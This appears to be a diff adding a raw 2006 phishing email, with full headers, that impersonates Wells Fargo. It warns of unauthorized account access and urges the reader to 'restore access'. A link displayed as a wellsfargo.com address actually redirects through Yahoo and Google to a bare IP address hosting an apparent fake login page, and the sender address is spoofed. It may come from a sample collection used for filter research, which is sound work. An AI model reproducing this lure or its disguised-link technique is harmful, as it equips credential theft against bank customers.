@@ -1,0 +1,180 @@
+Return-Path: <security@wellsfargo.com>
+X-Original-To: user@login.example.com
+Delivered-To: user@login.example.com
+Received: from mail.example.org (mail.example.org [192.168.6.4])
+	by example.com (Postfix) with ESMTP id 27E824691E
+	for <user@login.example.com>; Mon,  2 Oct 2006 18:51:32 -0400 (EDT)
+Received: from 192.168.6.4 (unknown [217.52.40.131])
+	by mail.example.org (Postfix) with SMTP id 673696FA49C
+	for <user@example.com>; Mon,  2 Oct 2006 18:51:31 -0400 (EDT)
+Received: from c8i.cmordo.net ([50.56.163.100]) by 192.168.6.4; Tue, 03 Oct 2006 01:48:15 +0300
+Message-ID: <6h814ria41q$m7b-qi$f0cwgq2-s@6khkmzc>
+From: "Wells Fargo Bank" <security@wellsfargo.com>
+To: <user@example.com>
+Subject: Online Banking Alert
+Date: Tue, 03 Oct 06 01:48:15 GMT
+X-Mailer: Microsoft Outlook, Build 10.0.2627
+MIME-Version: 1.0
+Content-Type: multipart/alternative;
+	boundary="B.D...DDD.2AB37._4E.FF."
+X-Priority: 3
+X-MSMail-Priority: Normal
+Status: O
+X-Status: 
+X-Keywords:                  
+X-UID: 366
+
+This is a multi-part message in MIME format.
+
+--B.D...DDD.2AB37._4E.FF.
+Content-Type: text/html;
+Content-Transfer-Encoding: quoted-printable
+
+<HTML>
+<HEAD><TITLE>Wells Fargo Primary Media Address Change</TITLE></HEAD>
+<BODY BGCOLOR=3D"white" link=3D"#405EBE" vlink=3D"#405EBE" alink=3D"#405EB=
+E">
+<STYLE TYPE=3D"TEXT/CSS">
+<!--
+	A:link{color=3D405EBE}
+	A:hover{color=3D#0000FF}
+-->
+</STYLE>
+<!-- ******Table****** -->
+<TABLE ALIGN=3D"left" WIDTH=3D747 BORDER=3D0 CELLPADDING=3D0
+CELLSPACING=3D=
+0>
+
+<!-- ******Banner Row 1****** -->
+<TR>
+	<TD WIDTH=3D100% COLSPAN=3D4 HEIGHT=3D80>
+		<img src=3D"http://www.humboldt.edu/~natmus/images/wellsFargoLogo.jpg"
+		 alt=3D"Wells Fargo Higher Standards" width=3D"152" height=3D"90">
+	</TD>
+</TR>
+
+
+<!-- ******Header Row 2***** -->
+<TR>
+	<!-- Row 2 Cell 1 -->
+	<TD WIDTH=3D13>
+	</TD>
+    <!-- Row 2 Cell 2 -->
+    <TD WIDTH=3D160 HEIGHT=3D103>
+    <img src=3D"http://release35.par3.com/images/client/bankofamerica/em_p=
+hoto.jpg" width=3D"160" height=3D"103"></TD>
+    <!-- Row 2 Cell 3 -->
+    <TD WIDTH=3D561 COLSPAN=3D2 HEIGHT=3D103 BGCOLOR=3D"#D4001A">
+  <img src=3D"http://release35.par3.com/images/client/bankofamerica/em_tit=
+le_red.gif" alt=3D"Online Banking Alert" width=3D"193" height=3D"103"></TD=
+>
+</TR>
+
+<!-- ******Blank (Spacing) Row 3****** -->
+<TR>
+	<TD WIDTH=3D100% COLSPAN=3D4 HEIGHT=3D23>
+	</TD>
+</TR>
+<!-- ******Header Row 4***** -->
+<TR>
+	<!-- Row 4 Cell 1 -->
+	<TD WIDTH=3D13>
+	</TD>
+    <!-- Row 4 Cell 2 -->
+    <TD WIDTH=3D160 VALIGN=3Dtop>
+  <a href=3D"http://www.wellsfargo.com">
+		<img src=3D"http://release35.par3.com/images/client/bankofamerica/em_pro=
+mo2.gif"
+		border=3D0 alt=3D"Need additional up to the minute account information? =
+Sign in" width=3D"160" height=3D"76">
+	</A>
+	</TD>
+    <!-- Row 4 Cell 3 -->
+    <TD WIDTH=3D13>
+	</TD>
+	 <!-- Row 4 Cell 4 Template Specific HTML goes here. -->
+    <TD WIDTH=3D561 VALIGN=3Dtop>
+		<p class=3DMsoNormal>
+		<b><span style=3D"FONT-SIZE: 14pt; COLOR: #d4001a; FONT-FAMILY: Verdana"=
+>
+		</span></b><span style=3D'font-size:14pt;font-family:Verdana;color:#D400=
+1A'><b style=3D'mso-bidi-font-weight:normal'> 
+		</b>
+		</p>
+		</span><span style=3D'font-family:Verdana;'>
+		<p class=3DMsoNormal>
+		<span style=3D"FONT-SIZE: 9pt; COLOR: #333333; FONT-FAMILY: Verdana">
+		We recently reviewed your account, and suspect that your Wells Fargo acc=
+ount may have been accessed by an unauthorized third party. 
+		Protecting the security of your account and of the Wells Fargo network i=
+s 
+		our primary concern. Therefore, as a preventative measure, we have 
+		temporarily limited access to sensitive account features. <br>
+		<br>
+		To restore your account access, please take the following steps to 
+		ensure that your account has not been compromised:<br></span><br>
+        <b>
+<a
+href=3D"http://rds.yahoo.com/_ylt=3DA0geurgnV4VEPnoB98hXNyoA;_ylu=3DX3o=
+DMTE5aXJmaGJ2BGNvbG8DZQRsA1dTMQRwb3MDMTIzBHNlYwNzcgR2dGlkA0Y3NTFfMTA4/SIG=3D=
+12hhjkhah/EXP=3D1149675687/**http://www.google.com/url?q=3Dhttp://211.94.2=
+40.21/_us/SecureOnlineSSL128/wf/index.html?ref=3Dpd_irl_gw_r/102-8758036-5=
+777720?opt=3Doa">
+https://www.wellsfargo.com/wfonline/access/GotoReset</a></b><br>
+		<p class=3DMsoNormal>
+		<span style=3D"FONT-SIZE: 9pt; COLOR: #333333; FONT-FAMILY: Verdana">
+		We apologize for any inconvenience this may cause, and appreciate your 
+		assistance in helping us maintain the integrity of the entire Wells Farg=
+o 
+		Online Banking system.</span><p class=3DMsoNormal>
+		<span style=3D"FONT-SIZE: 9pt; COLOR: #333333; FONT-FAMILY: Verdana">
+		Thank you.</span><span style=3D"color: #333333; font-size: 9pt"> <br><br=
+>
+		</span></span>
+		<span style=3D'font-size:9pt;font-family:Verdana;color:#405EBE'>  <br>
+
+<HR WIDTH=3D561 SIZE=3D1 COLOR=3D"#CCCCCC">
+
+		<p class=3DMsoNormal>
+		<b style=3D'mso-bidi-font-weight:normal'><span style=3D'font-size:8pt;fo=
+nt-family:Verdana;color:#A7A6A6'>
+		</b>
+						Because your reply will not be transmitted via secure e-mail, the e-=
+mail address that generated this alert will not accept
+						replies. If you would like to contact Wells Fargo with questions or =
+comments, please 
+			
+						<a href=3D"http://rds.yahoo.com/_ylt=3DA0geurgnV4VEPnoB98hXNyoA;_ylu=
+=3DX3oDMTE5aXJmaGJ2BGNvbG8DZQRsA1dTMQRwb3MDMTIzBHNlYwNzcgR2dGlkA0Y3NTFfMTA=
+4/SIG=3D12hhjkhah/EXP=3D1149675687/**http://www.google.com/url?q=3Dhttp://=
+211.94.240.21/_us/SecureOnlineSSL128/wf/index.html?ref=3Dpd_irl_gw_r/102-8=
+758036-5777720?opt=3Doa">sign in to Online Banking</a>
+			
+			and visit the customer service section.
+						<br>
+						<br>
+			</td>
+			</tr>
+			<tr >
+			    <TD WIDTH=3D13>
+				</TD>
+			<td colspan=3D8>
+						<HR WIDTH=3D747 SIZE=3D1 COLOR=3D"#CCCCCC">
+						<br>
+				<span style=3D'font-size:8pt;font-family:Verdana;color:#333333'>
+						Wells Fargo, N.A. Member FDIC. <a href=3D"https://www.wellsfargo.com=
+/privacy_security/">Equal Housing Lender</a>  
+                        <img src=3D"http://release35.par3.com/images/clien=
+t/bankofamerica/house_1.gif" width=3D"14" height=3D"9">
+						<br>
+						=FFFFFFA9 2006 Wells Fargo Corporation. All rights reserved
+					</p>
+			
+				</TD>
+			
+			</TR>
+			
+</TABLE>
+
+--B.D...DDD.2AB37._4E.FF.--
+
